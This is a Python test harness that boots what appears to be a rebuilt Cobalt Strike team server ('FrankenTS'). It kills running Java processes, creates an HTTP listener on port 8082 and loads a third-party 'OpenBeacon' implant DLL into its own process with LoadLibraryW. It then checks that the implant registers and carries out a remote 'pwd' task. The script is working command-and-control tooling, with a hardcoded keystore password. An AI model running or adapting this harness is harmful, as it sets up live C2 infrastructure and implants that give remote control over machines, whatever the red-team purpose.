# -*- coding: utf-8 -*-
"""openbeacon_test.py - test 1 execution: third-party OpenBeacon DLL vs our
FrankenTS. Boot TS + headless client, HTTP listener 8082, LoadLibrary the
OpenBeacon DLL (self-starts on attach), verify INITIAL + task round-trip."""
import os
import re
import subprocess
import sys
import time
from pathlib import Path

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
OB_DLL = r"C:\Users\Public\openbeacon_x64.dll"
OUT = open(r"C:\Users\Public\openbeacon_test.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()
    print(m, flush=True)


def main():
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
                        'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\'" | '
                        'ForEach-Object { "$($_.ProcessId)" }'],
                       capture_output=True, text=True, timeout=60)
    for p in [x.strip() for x in r.stdout.split() if x.strip().isdigit()]:
        subprocess.run(["taskkill", "/PID", p, "/F"], capture_output=True)
    time.sleep(4)
    for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
        if os.path.exists(f):
            os.remove(f)

    subprocess.Popen([JDK + r"\java.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                      "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                      "-Djavax.net.ssl.keyStorePassword=123456",
                      "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                     cwd=TSBOOT)
    time.sleep(12)
    subprocess.Popen([JDK + r"\javaw.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx512m", "-cp", JAR,
                      "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opOB", "franken",
                      "headless_franken.cna"],
                     cwd=TSBOOT)
    deadline = time.time() + 120
    while time.time() < deadline:
        if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
            break
        time.sleep(3)
    log("TS ready")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send
    send("listener_create", "franken-http", "8082", "192.168.100.200")
    time.sleep(5)
    up = subprocess.run(["powershell", "-NoProfile", "-Command",
                         "(Test-NetConnection -ComputerName 127.0.0.1 -Port 8082 -InformationLevel Quiet -WarningAction SilentlyContinue)"],
                        capture_output=True, text=True).stdout.strip()
    log("listener 8082 up: %s" % up)
    if up != "True":
        log("LISTENER NOT UP - abort")
        return

    # load the OpenBeacon DLL in this process (self-starts on attach)
    import ctypes
    k32 = ctypes.windll.kernel32
    k32.LoadLibraryW.restype = ctypes.c_void_p
    h = k32.LoadLibraryW(OB_DLL)
    log("OpenBeacon loaded: %s base=0x%X" % (bool(h), h or 0))
    if not h:
        log("LOAD FAIL gle=%d" % k32.GetLastError())
        return

    # wait for INITIAL from the third-party beacon
    p0 = len(open(LOG, encoding="utf-8", errors="replace").read())
    bid = None
    t0 = time.time()
    while time.time() - t0 < 90:
        seg = open(LOG, encoding="utf-8", errors="replace").read()[p0:]
        m = re.findall(r"INITIAL\t(\d+)", seg)
        if m:
            bid = m[-1]
            break
        time.sleep(2)
    if bid is None:
        log("NO INITIAL from OpenBeacon within 90s")
        return
    log("SESSION REGISTERED bid=%s (THIRD-PARTY BEACON ON OUR TS)" % bid)

    # task round-trip: pwd
    send("target", bid)
    time.sleep(2)
    p1 = len(open(LOG, encoding="utf-8", errors="replace").read())
    send("pwd")
    m = None
    t0 = time.time()
    while time.time() - t0 < 60:
        seg = open(LOG, encoding="utf-8", errors="replace").read()[p1:]
        m = re.search(r"ALT\t" + bid + r"\t.*[Cc]urrent directory", seg)
        if m:
            break
        time.sleep(2)
    log("pwd round trip: %s" % ("PASS " + m.group(0)[:80] if m else "FAIL"))
    log("OPENBEACON CONFORMANCE: %s" % ("PASS" if m else "PARTIAL"))


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
